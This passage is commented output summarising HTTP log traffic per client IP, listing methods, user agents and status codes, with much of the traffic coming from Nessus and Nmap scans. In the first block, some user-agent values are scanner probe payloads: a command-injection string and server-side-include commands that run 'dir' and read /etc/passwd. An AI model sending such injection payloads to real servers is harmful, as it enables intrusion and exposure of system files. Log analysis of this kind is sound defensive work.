#  'X-MS-ENUMATTS' 'TRACK' 'NESSUS' nan 'MFOQUA' 'VJMNEN' 'DMNCWL' 'PAXCMJ'
#  'CQIWXY' 'KKCGMS' 'SHXWQN']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  nan 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'
#  'Nessus SOAP v0.0.1 (Nessus.org)' 'Nessus' 'NESSUS::SOAP' 'webmin'
#  '"; system(id);#' "mercuryboard_user_agent_sql_injection.nasl'"
#  'Mozilla/4.0 (compatible; gallery_203.nasl; Googlebot)'
#  'Fastream NETFile Server' '<!--#exec cmd="dir"-->'
#  'nessus=<!--#exec cmd="dir"-->' '<!--#exec cmd="cat /etc/passwd"-->'
#  'nessus=<!--#exec cmd="cat /etc/passwd"-->'
#  '<!--#include file="nessus897043736.html"-->'
#  'nessus=<!--#include file="nessus897043736.html"-->'
#  'NetSupport Manager/1.0']
# Status Code:  [403. 200. 404. 302. 304. 400.  nan 501. 405. 417. 206. 301. 303. 500.
#  401.]
# Status Message:  ['Forbidden' 'OK' 'Not Found' 'NOT FOUND' 'FOUND' 'Found' 'Not Modified'
#  'NOT MODIFIED' 'Bad Request' nan 'Method Not Implemented'
#  'Method Not Allowed' 'Not Implemented' 'Expectation Failed'
#  'Partial Content' '<empty>' 'Moved Permanently' 'See Other'
#  'Internal Server Error' 'Authorization Required' 'Unauthorized']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'PROXY-CONNECTION -> Close']
#
#
#
# IP:  192.168.24.253
#
# Method:  ['GET']
# User Agent:  ['Wget/1.10.2 (Red Hat modified)']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.144
#
# Method:  ['GET' 'POST' nan 'OPTIONS' 'HEAD' 'CONNECT']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'
#  nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)']
# Status Code:  [200. 302. 304. 403. 400. 303. 404. 401.]
# Status Message:  ['OK' 'Found' 'Not Modified' 'Forbidden' '<empty>' 'See Other' 'Not Found'
#  'NOT FOUND' 'Authorization Required']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.140
#
# Method:  ['GET' nan 'HEAD' 'CONNECT' 'some' 'Secure' 'RXIZKG' 'POST' 'GNUTELLA'
#  'OPTIONS' 'PROPFIND' 'SEARCH' 'TRACE' 'NESSUS' 'PUT' 'BQXNEI' 'BERSCF'
#  'TRACK' 'ZGZYRW' 'WFXUQY' 'ALKYKO' 'KBSHMY' 'SQWQKT' 'EASNMD' 'OTVOUM'
#  'FUXMRF' 'OKJZNB' 'GRKOAY' 'VXDZJC' 'VBOOEA' 'XXHIWD' 'MGDROM' 'DBDBVB'
#  'JWLBTC' 'QQJFKG' 'PZOEIU' 'DQCVIG' 'TKBNIZ' 'EIJCKE' 'SEBPCS' 'WEPOUS'
#  'FHWOGL' 'BMWXZT' 'HRYNHJ' 'AAEVMM' 'BZSYYU' 'user' 'HMTLIX']
# User Agent:  [nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)'
#  'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'
#  'Nessus' 'Nessus SOAP v0.0.1 (Nessus.org)' 'webmin' 'NESSUS::SOAP'
#  'Fastream NETFile Server' 'MSFrontPage/4.0'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
#  'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:11.0) Gecko/20100101 Firefox/11.0']
# Status Code:  [200. 400. 403. 302. 503. 404. 303. 401.  nan 301. 405. 417. 500. 501.
#  206. 201.]
# Status Message:  ['OK' 'Bad Request' 'Forbidden' '<empty>' 'Found' 'Service Unavailable'
#  'Not Found' 'See Other' 'NOT FOUND' 'Authorization Required' nan
#  'Moved Permanently' 'Method Not Allowed' 'Expectation Failed'
#  'Internal Server Error' 'Method Not Implemented' 'METHOD NOT ALLOWED'
#  'Not Allowed' 'Not Implemented' 'Partial Content' 'Created']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan 'PROXY-CONNECTION -> Close']
#
#
#
# IP:  2001:dbb:c18:202:20c:29ff:fe18:b667
#
# Method:  ['GET']
# User Agent:  ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)']
# Status Code:  [302. 200.]
# Status Message:  ['Found' 'OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  2001:dbb:c18:202:20c:29ff:fe41:4be7
#
# Method:  ['GET' 'OPTIONS' 'HEAD' 'TRACE' 'POST']
# User Agent:  [nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)']
# Status Code:  [200. 404.]
# Status Message:  ['OK' 'Not Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.141
#
# Method:  ['GET' 'PUT' 'OPTIONS' 'HEAD']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' nan
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)']
# Status Code:  [200. 404. 401. 201.  nan 206.]
# Status Message:  ['OK' 'NOT FOUND' 'Authorization Required' 'Created' nan 'Partial Content']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.21.253
#
# Method:  ['GET']
# User Agent:  ['Wget/1.10.2 (Red Hat modified)']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.22.253
#
# Method:  ['GET']
# User Agent:  ['Wget/1.10.2 (Red Hat modified)']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.28.253
#
# Method:  ['GET']
# User Agent:  ['Wget/1.10.2 (Red Hat modified)']
# Status Code:  [200.]
# Status Message:  ['OK']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.222
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1']
# Status Code:  [200. 404.]
# Status Message:  ['OK' 'NOT FOUND' 'Not Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.136
#
# Method:  ['GET' 'PUT' 'POST' 'OPTIONS' 'HEAD' 'CONNECT']
# User Agent:  [nan 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
#  'Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2'
#  'Wget/1.12 (linux-gnu)'
#  'Mozilla/5.0 (compatible; Nmap Scripting Engine; http://nmap.org/book/nse.html)']
# Status Code:  [200. 503. 405. 401. 500. 201.  nan 302. 404. 403.]
# Status Message:  ['OK' 'Service Unavailable' 'Method Not Allowed' 'Authorization Required'
#  'Internal Server Error' 'Created' nan 'Found' 'Not Found' 'Forbidden']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.143
#
# Method:  ['GET' 'PUT' 'POST']
# User Agent:  [nan 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)'
#  'Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1']
# Status Code:  [200. 401. 201.  nan 404. 301. 302.]
# Status Message:  ['OK' 'Authorization Required' 'Created' nan 'Not Found'
#  'Moved Permanently' 'Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.63
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (Linux; U; Android 3.2.1; en-us; Transformer Prime TF201 Build/HTK75) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13']
# Status Code:  [302. 200. 304. 404.  nan]
# Status Message:  ['Found' 'OK' 'Not Modified' 'Not Found' nan]
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.64
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (Linux; U; Android 3.2.1; en-us; Transformer Prime TF201 Build/HTK75) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13']
# Status Code:  [200. 302. 404.]
# Status Message:  ['OK' 'Found' 'Not Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.152
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (Linux; U; Android 3.2.1; en-us; Transformer Prime TF201 Build/HTK75) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13']
# Status Code:  [302. 200. 404.]
# Status Message:  ['Found' 'OK' 'Not Found']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.62
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (Linux; U; Android 3.2.1; en-us; Transformer Prime TF201 Build/HTK75) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13']
# Status Code:  [302. 200. 404. 403.]
# Status Message:  ['Found' 'OK' 'Not Found' 'Forbidden']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.153
#
# Method:  ['GET' 'get']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:5.0.1) Gecko/20100101 Firefox/5.0.1'
#  nan]
# Status Code:  [200.  nan]
# Status Message:  ['OK' nan]
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
#
#
#
# IP:  192.168.202.150
#
# Method:  ['GET' 'POST']
# User Agent:  ['Mozilla/5.0 (X11; Linux i686; rv:10.0.2) Gecko/20100101 Firefox/10.0.2']
# Status Code:  [200. 404. 304. 302.]
# Status Message:  ['OK' 'NOT FOUND' 'Not Found' 'Not Modified' 'Found' 'NOT MODIFIED']
# Info Code:  [nan]
# Info Message:  [nan]
# Proxied:  [nan]
